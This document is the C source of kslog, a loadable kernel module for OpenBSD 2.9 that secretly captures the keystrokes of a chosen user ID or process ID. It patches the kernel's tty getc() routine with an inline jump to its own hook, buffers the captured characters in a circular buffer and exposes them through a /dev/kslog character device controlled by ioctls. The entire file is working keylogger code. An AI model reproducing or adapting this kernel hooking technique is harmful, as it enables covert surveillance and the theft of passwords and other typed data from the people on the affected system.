/*
 * kslog.c
 *
 * keystroke logging LKM for OpenBSD 2.9 (untested on other versions).
 *
 * logs keystrokes from one UID or PID and places into circular char
 * buffer. characters can be retrieved via the /dev/kslog character
 * device using the kslog userland application (or an easily written
 * custom application).
 *
 * mike@gravitino.net
 */

#include <sys/param.h>
#include <sys/fcntl.h>
#include <sys/systm.h>
#include <sys/ioctl.h>
#include <sys/exec.h>
#include <sys/conf.h>
#include <sys/lkm.h>
#include <sys/tty.h>
#include <sys/proc.h>
#include <sys/malloc.h>

#include "kslog.h"
#include "circbuf.h"

#define MOD_NAME  "kslog"

/*
 * device initialization macro
 */
#define cdev_init(c, n) 			 \
	{ 					 \
		dev_init(c,n,open), 		 \
		dev_init(c,n,close),		 \
		dev_init(c,n,read), 		 \
		(dev_type_write((*)))  lkmenodev,\
		dev_init(c,n,ioctl),		 \
		(dev_type_stop((*)))   lkmenodev,\
		0,				 \
		(dev_type_select((*))) lkmenodev,\
		(dev_type_mmap((*)))   lkmenodev \
	}

/*
 *
 * character device functions:
 * 
 * open()
 * -----------
 * does nothing.
 *
 * read()
 * -----------
 * read returns up to size of provided buffer number of keystrokes or the
 * current number of buffered keystrokes or -1 if no keystrokes are saved.
 * 
 * close()
 * -----------
 * does nothing.
 *
 * ioctl()
 * -----------
 * ioctl is the main "control" function. UID/PID is set via ioctl. kslog
 * START/STOP is set via ioctl.
 *
 */
int	kslog_open	__P((dev_t dev, int oflags, int devtype,  struct proc *p));
int	kslog_read	__P((dev_t dev, struct uio *uio, int ioflag));
int	kslog_close	__P((dev_t dev, int fflag, int devtype,  struct proc *p));
int	kslog_ioctl	__P((dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p));
int	kslog_handler	__P((struct lkm_table *lkmtp, int cmd));

/*
 * declare & init character device structure
 */
cdev_decl(kslog);
static struct cdevsw cdev_kslog = cdev_init(1, kslog_);

/*
 * character device module
 */
MOD_DEV(MOD_NAME, LM_DT_CHAR, -1, &cdev_kslog);

/*
 * kslog specific variables & data structures
 */
#define UID 0
#define PID 1
 
//
// track current status
//
static int active;

//
// uid/pid to log
//
static int Xid;	

//
// id type, either UID or PID constant vlaue
//
static int id_type;	

//
// our circular char buffer
//
static circular_buffer circbuf;

/*
 * function hijacking stuff
 */
#define CODE_LEN  7

/*
 * tty get char function to hijack
 */
extern int	getc   __P((struct clist *));

/*
 * current process (that we're in the context of when capturing the keystroke)
 */
extern struct proc *curproc;

/*
 * our fluffy little buffers. 
 */
static char getc_svd_code[CODE_LEN];
static char getc_jmp_code[]   = "\xB8\x00\x00\x00\x00\xFF\xE0";

/*
 * circular buffer functions..
 */

/*
 * initialize circular_buffer structure:
 * zero out structure & save buf & len args to structure members
 */
void	cb_init(circular_buffer *cb, unsigned char *buf, int len)
{
	memset(cb, 0, sizeof(circular_buffer));

	/*
	 * allocate & initialize buffer
	 */
	cb->buf = buf;
	cb->len = len;
}

/*
 * place character into circular buffer
 */
void	cb_putc(circular_buffer *cb, char ch)
{
	cb->buf[cb->curr] = ch;
	
	if(cb->size < cb->len)
		++cb->size;

	if(cb->loop && cb->next == cb->curr)
		if(++cb->next == cb->len)
			cb->next = 0;

	if(++cb->curr == cb->len)
	{
		cb->curr = 0;
		cb->loop = 1;
	}
}

/*
 * remove character from circular buffer
 */
int	cb_getc(circular_buffer *cb, char *ch)
{
	if(cb->size == 0)
		return -1;

	*ch = cb->buf[cb->next];

	if(--cb->size == 0)
		cb->curr =
		cb->next =
		cb->loop = 0;
	else
		if(++cb->next == cb->len)
			cb->next = 0;

	return 0;
}

//
// hijack function - need to investigate spl*() usage.
//
static int	h_getc (struct clist *l)
{
	int ret;
	int s;
	int tmp_id = -1;

	s = spltty();
	memcpy(getc, getc_svd_code, CODE_LEN);
	splx(s);

	ret = getc(l);

	s = spltty();
	memcpy(getc, getc_jmp_code, CODE_LEN);
	splx(s);

	//
	// process keystroke - log if uid/pid matches Xid
	//
	if(ret > 0 && curproc != NULL)
	{
		if(id_type == UID)
		{
			if(curproc->p_cred != NULL)
			{
				tmp_id = curproc->p_cred->p_ruid;
			}
		}
		else // PID
		{
			tmp_id = curproc->p_pid;
		}

		if(tmp_id != -1 && tmp_id == Xid)
		{
			cb_putc(&circbuf, ret);
		}
	}

	return(ret);
}

/*
 * open()
 */
int	kslog_open	(dev_t dev, int oflags, int devtype, struct proc *p)
{
	return(0);
}

/*
 * read()
 */

//
// currently only support non-vector reads (read() not readv())
//
int	kslog_read	(dev_t dev, struct uio *uio, int ioflag)
{
	struct iovec *vec;
	int    iovcnt = 0;
	int    cnt    = 0;
	int    error  = 0;
	int    len    = 0;
	char   ch;
	
	if(uio != NULL && active != 0)
	{
		len = uio->uio_resid;

		while(cnt < len && cb_getc(&circbuf, &ch) != -1)
		{
			error = uiomove(&ch, 1, uio);
			if(error)
			{
				break;
			}
			++cnt;
		}
	}
	
	return(error);
}
 
/*
 * close()
 */
int	kslog_close	(dev_t dev, int fflag, int devtype, struct proc *p)
{
	return(0);
}

/*
 * ioctl()
 */
int	kslog_ioctl	(dev_t dev, u_long cmd,	caddr_t data, int fflag, struct proc *p)
{
	unsigned int addr   = 0;
	int 	     retval = 0;
	struct 	     kslog_op *op = NULL;

	/*
	 * process IOCTL commands for kslog
	 */
	switch(cmd)
	{
		case KSLOG_SETPID:
		
			op      = (struct kslog_op *)data;
			id_type = PID;
			Xid     = op->val;

			break;
			
		case KSLOG_SETUID:
		
			op      = (struct kslog_op *)data;
			id_type = UID;
			Xid     = op->val;
			
			break;
			
		case KSLOG_START:
		
			if(!active)
			{
				memcpy(getc_svd_code, getc, CODE_LEN);
				addr = (unsigned int)h_getc;
				memcpy(getc_jmp_code + 1, &addr, 4);
			
				// hijack getc here
				memcpy(getc, getc_jmp_code, CODE_LEN);
				active = 1;
			}

			break;
			
		case KSLOG_STOP:
		
			if(active)
			{
				// unhijack
				memcpy(getc, getc_svd_code, CODE_LEN);
				active = 0;
				circbuf.size = 
				circbuf.next =
				circbuf.curr =
				circbuf.loop = 0;
			}
			
			break;
			
		case KSLOG_STATUS:
	
			op = (struct kslog_op *)data;
			printf("status is: %d\n", active);
			op->val = active;
			
			break;
			
		default:
		
			retval = ENOTTY;	// this the right error value?
			
			break;
	}
	
	return(retval);
} 
 
/*
 * handler()
 */
int	kslog_handler	(struct lkm_table *lkmtp, int cmd)
{
	if(cmd == LKM_E_LOAD)
	{
		active  =
		id_type =
		Xid     = 0;
	
		// allocate circular buffer space & initialize 
		// circular buffer structure

		circbuf.buf = (char *)malloc(CBUF_SIZE, M_DEVBUF, M_WAITOK);
		if(circbuf.buf == NULL)
		{
			return(-1);
		}

		cb_init(&circbuf, circbuf.buf, CBUF_SIZE);
	}
	else if(cmd == LKM_E_UNLOAD)
	{
		// if active, deactivate
		if(active)
		{
			memcpy(getc, getc_svd_code, CODE_LEN);
		}

		// deallocate buffer space
		free(circbuf.buf, M_DEVBUF);
	}
	
	return(0);
}

/*
 * entry point
 */
int handler(struct lkm_table *lkmtp, int cmd, int ver)
{
	DISPATCH(lkmtp, cmd, ver, kslog_handler, kslog_handler, lkm_nofunc);
}
